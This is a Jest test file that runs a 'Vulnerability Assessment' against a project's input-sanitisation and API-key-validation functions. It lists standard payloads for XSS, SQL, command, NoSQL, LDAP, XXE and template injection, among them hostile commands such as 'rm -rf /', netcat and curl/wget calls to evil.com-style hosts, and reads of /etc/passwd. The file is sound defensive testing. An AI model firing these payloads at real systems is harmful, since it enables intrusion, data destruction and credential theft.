import { sanitizeInput, sanitizeEmailContent, validateApiKeyFormat } from '../lib/security'

describe('Vulnerability Assessment', () => {
  describe('XSS Protection', () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      '<img src="x" onerror="alert(1)">',
      'javascript:alert("xss")',
      '<svg onload="alert(1)">',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<object data="javascript:alert(1)"></object>',
      '<embed src="javascript:alert(1)">',
      '<link rel="stylesheet" href="javascript:alert(1)">',
      '<style>@import "javascript:alert(1)"</style>',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox("xss")',
      '<div onclick="alert(1)">Click me</div>',
      '<input onfocus="alert(1)" autofocus>',
      '<select onfocus="alert(1)" autofocus><option>test</option></select>',
      '<textarea onfocus="alert(1)" autofocus>test</textarea>',
      '<keygen onfocus="alert(1)" autofocus>',
      '<video><source onerror="alert(1)">',
      '<audio src="x" onerror="alert(1)">',
      '<details open ontoggle="alert(1)">',
      '<marquee onstart="alert(1)">test</marquee>',
    ]

    xssPayloads.forEach((payload, index) => {
      it(`should sanitize XSS payload ${index + 1}: ${payload.substring(0, 50)}...`, () => {
        const sanitized = sanitizeInput(payload)
        
        // Should not contain script tags or javascript: protocol
        expect(sanitized).not.toContain('<script')
        expect(sanitized).not.toContain('javascript:')
        expect(sanitized).not.toContain('vbscript:')
        expect(sanitized).not.toContain('data:')
        expect(sanitized).not.toContain('onerror=')
        expect(sanitized).not.toContain('onload=')
        expect(sanitized).not.toContain('onclick=')
        expect(sanitized).not.toContain('onfocus=')
      })
    })

    it('should handle nested XSS attempts', () => {
      const nestedPayload = '<div><script>alert("nested")</script><p onclick="alert(1)">text</p></div>'
      const sanitized = sanitizeInput(nestedPayload)
      
      expect(sanitized).not.toContain('<script')
      expect(sanitized).not.toContain('onclick=')
    })

    it('should handle encoded XSS attempts', () => {
      const encodedPayloads = [
        '&lt;script&gt;alert("xss")&lt;/script&gt;',
        '%3Cscript%3Ealert("xss")%3C/script%3E',
        '&#60;script&#62;alert("xss")&#60;/script&#62;',
      ]

      encodedPayloads.forEach(payload => {
        const sanitized = sanitizeInput(payload)
        // Should handle encoded content safely
        expect(sanitized).toBeDefined()
        expect(typeof sanitized).toBe('string')
      })
    })
  })

  describe('SQL Injection Protection', () => {
    const sqlPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM users --",
      "'; INSERT INTO users VALUES ('hacker', 'password'); --",
      "' OR 1=1 --",
      "admin'--",
      "admin'/*",
      "' OR 'x'='x",
      "'; EXEC xp_cmdshell('dir'); --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --",
    ]

    sqlPayloads.forEach((payload, index) => {
      it(`should sanitize SQL injection payload ${index + 1}: ${payload}`, () => {
        const sanitized = sanitizeInput(payload)
        
        // Should not contain SQL injection patterns
        expect(sanitized).not.toContain('DROP TABLE')
        expect(sanitized).not.toContain('UNION SELECT')
        expect(sanitized).not.toContain('INSERT INTO')
        expect(sanitized).not.toContain('EXEC xp_cmdshell')
        expect(sanitized).not.toContain('--')
        expect(sanitized).not.toContain('/*')
      })
    })
  })

  describe('Command Injection Protection', () => {
    const commandPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '&& rm -rf /',
      '`whoami`',
      '$(id)',
      '; ping google.com',
      '| nc -l 4444',
      '&& curl http://evil.com',
      '; wget http://malicious.com/script.sh',
      '| bash',
    ]

    commandPayloads.forEach((payload, index) => {
      it(`should sanitize command injection payload ${index + 1}: ${payload}`, () => {
        const sanitized = sanitizeInput(payload)
        
        // Should not contain command injection patterns
        expect(sanitized).not.toContain(';')
        expect(sanitized).not.toContain('|')
        expect(sanitized).not.toContain('&&')
        expect(sanitized).not.toContain('`')
        expect(sanitized).not.toContain('$(')
      })
    })
  })

  describe('Path Traversal Protection', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '/var/www/../../etc/passwd',
      'file:///etc/passwd',
      '\\\\server\\share\\file.txt',
    ]

    pathTraversalPayloads.forEach((payload, index) => {
      it(`should sanitize path traversal payload ${index + 1}: ${payload}`, () => {
        const sanitized = sanitizeInput(payload)
        
        // Should handle path traversal attempts
        expect(sanitized).toBeDefined()
        expect(typeof sanitized).toBe('string')
        // The exact sanitization depends on implementation
      })
    })
  })

  describe('API Key Security', () => {
    it('should reject common weak API keys', () => {
      const weakKeys = [
        'test',
        'demo',
        'example',
        'AIzaSyTest',
        'AIzaSyDemo',
        'AIzaSyExample',
        '12345',
        'password',
        'admin',
        'AIzaSy12345',
      ]

      weakKeys.forEach(key => {
        const result = validateApiKeyFormat(key)
        expect(result.isValid).toBe(false)
      })
    })

    it('should reject API keys with suspicious patterns', () => {
      const suspiciousKeys = [
        'AIzaSy' + 'A'.repeat(50), // Too long
        'AIzaSy@#$%', // Invalid characters
        'BIzaSyValidLookingButWrongPrefix', // Wrong prefix
        'AIzaSy', // Too short
        '', // Empty
        'null',
        'undefined',
      ]

      suspiciousKeys.forEach(key => {
        const result = validateApiKeyFormat(key)
        expect(result.isValid).toBe(false)
      })
    })
  })

  describe('Email Content Security', () => {
    it('should handle malicious email content', () => {
      const maliciousEmails = [
        'Dear user, <script>steal_credentials()</script>',
        'Click here: javascript:malicious_function()',
        'Download: data:application/octet-stream;base64,malicious_data',
        '<iframe src="http://evil.com/phishing"></iframe>',
        '<form action="http://evil.com/steal" method="post">',
        '<link rel="stylesheet" href="http://evil.com/steal.css">',
      ]

      maliciousEmails.forEach(email => {
        expect(() => {
          const sanitized = sanitizeEmailContent(email)
          expect(sanitized).not.toContain('<script')
          expect(sanitized).not.toContain('javascript:')
          expect(sanitized).not.toContain('<iframe')
          expect(sanitized).not.toContain('<form')
        }).not.toThrow()
      })
    })

    it('should reject extremely long email content', () => {
      const longContent = 'A'.repeat(10001)
      expect(() => sanitizeEmailContent(longContent)).toThrow('Email content too long')
    })

    it('should reject empty email content', () => {
      expect(() => sanitizeEmailContent('')).toThrow('Email content cannot be empty')
      expect(() => sanitizeEmailContent('   ')).toThrow('Email content cannot be empty')
    })
  })

  describe('Unicode and Encoding Attacks', () => {
    it('should handle Unicode normalization attacks', () => {
      const unicodePayloads = [
        'â„³ð’¶ð“ð’¾ð’¸ð’¾â„´ð“Šð“ˆ', // Mathematical script
        'ð•¸ð–†ð–‘ð–Žð–ˆð–Žð–”ð–šð–˜', // Mathematical bold fraktur
        'ï¼­ï½ï½Œï½‰ï½ƒï½‰ï½ï½•ï½“', // Fullwidth characters
        'ðŒðšð¥ð¢ðœð¢ð¨ð®ð¬', // Mathematical bold
        'Ðœð–†ð–‘ð–Žð–ˆð–Žð–”ð–šð–˜', // Mixed Cyrillic and mathematical
      ]

      unicodePayloads.forEach(payload => {
        const sanitized = sanitizeInput(payload)
        expect(sanitized).toBeDefined()
        expect(typeof sanitized).toBe('string')
      })
    })

    it('should handle various encoding attempts', () => {
      const encodingPayloads = [
        '%3Cscript%3E', // URL encoding
        '&lt;script&gt;', // HTML entities
        '\\u003cscript\\u003e', // Unicode escapes
        '\x3cscript\x3e', // Hex escapes
        String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62), // Character codes
      ]

      encodingPayloads.forEach(payload => {
        const sanitized = sanitizeInput(payload)
        expect(sanitized).toBeDefined()
        expect(typeof sanitized).toBe('string')
      })
    })
  })

  describe('Prototype Pollution Protection', () => {
    it('should handle prototype pollution attempts', () => {
      const pollutionPayloads = [
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        '__proto__.isAdmin = true',
        'constructor.prototype.isAdmin = true',
      ]

      pollutionPayloads.forEach(payload => {
        const sanitized = sanitizeInput(payload)
        expect(sanitized).not.toContain('__proto__')
        expect(sanitized).not.toContain('constructor')
        expect(sanitized).not.toContain('prototype')
      })
    })
  })

  describe('NoSQL Injection Protection', () => {
    it('should handle NoSQL injection attempts', () => {
      const nosqlPayloads = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "function() { return true; }"}',
        '{"$expr": {"$eq": [1, 1]}}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
      ]

      nosqlPayloads.forEach(payload => {
        const sanitized = sanitizeInput(payload)
        expect(sanitized).not.toContain('$ne')
        expect(sanitized).not.toContain('$gt')
        expect(sanitized).not.toContain('$regex')
        expect(sanitized).not.toContain('$where')
        expect(sanitized).not.toContain('$expr')
      })
    })
  })

  describe('LDAP Injection Protection', () => {
    it('should handle LDAP injection attempts', () => {
      const ldapPayloads = [
        '*)(uid=*',
        '*)(|(uid=*',
        '*)(&(uid=*',
        '*))%00',
        '*()|%26',
        '*)(objectClass=*',
      ]

      ldapPayloads.forEach(payload => {
        const sanitized = sanitizeInput(payload)
        // Should handle LDAP injection patterns
        expect(sanitized).toBeDefined()
        expect(typeof sanitized).toBe('string')
      })
    })
  })

  describe('XML/XXE Protection', () => {
    it('should handle XML injection attempts', () => {
      const xmlPayloads = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>',
        '<![CDATA[<script>alert("xss")</script>]]>',
      ]

      xmlPayloads.forEach(payload => {
        const sanitized = sanitizeInput(payload)
        expect(sanitized).not.toContain('<!DOCTYPE')
        expect(sanitized).not.toContain('<!ENTITY')
        expect(sanitized).not.toContain('SYSTEM')
        expect(sanitized).not.toContain('<![CDATA[')
      })
    })
  })

  describe('Server-Side Template Injection (SSTI) Protection', () => {
    it('should handle SSTI attempts', () => {
      const sstiPayloads = [
        '{{7*7}}',
        '${7*7}',
        '#{7*7}',
        '<%= 7*7 %>',
        '{{config}}',
        '{{request}}',
        '${T(java.lang.Runtime).getRuntime().exec("id")}',
        '{{"".__class__.__mro__[2].__subclasses__()}}',
      ]

      sstiPayloads.forEach(payload => {
        const sanitized = sanitizeInput(payload)
        expect(sanitized).not.toContain('{{')
        expect(sanitized).not.toContain('}}')
        expect(sanitized).not.toContain('${')
        expect(sanitized).not.toContain('<%=')
        expect(sanitized).not.toContain('%>')
      })
    })
  })
})